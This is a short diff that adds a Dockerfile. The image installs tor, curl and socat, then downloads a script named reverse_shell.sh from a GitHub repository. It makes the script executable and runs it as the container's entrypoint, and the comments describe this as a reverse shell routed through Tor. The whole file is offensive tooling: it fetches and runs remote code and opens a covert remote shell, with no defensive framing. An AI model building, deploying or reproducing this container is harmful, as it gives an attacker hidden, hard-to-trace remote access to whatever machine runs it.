@@ -1,0 +1,22 @@
+# Base Image
+FROM debian:latest
+
+# Set environment variables to minimize interaction during installation
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Install necessary packages
+RUN apt-get update && \
+    apt-get install -y tor curl socat && \
+    rm -rf /var/lib/apt/lists/*
+
+## Create a working dir 
+
+WORKDIR /the/workdir/path
+# Copy the reverse shell script from the GitHub repository
+ADD https://raw.githubusercontent.com/tpaphysics/tor-reverse-shell/main/rshell/reverse_shell.sh /opt/reverse_shell.sh
+
+# Make the script executable
+RUN chmod +x /opt/reverse_shell.sh
+
+# Command to run the reverse shell script using Tor, with log forwarding
+ENTRYPOINT ["/bin/bash", "-c", "/opt/reverse_shell.sh 2>&1"]
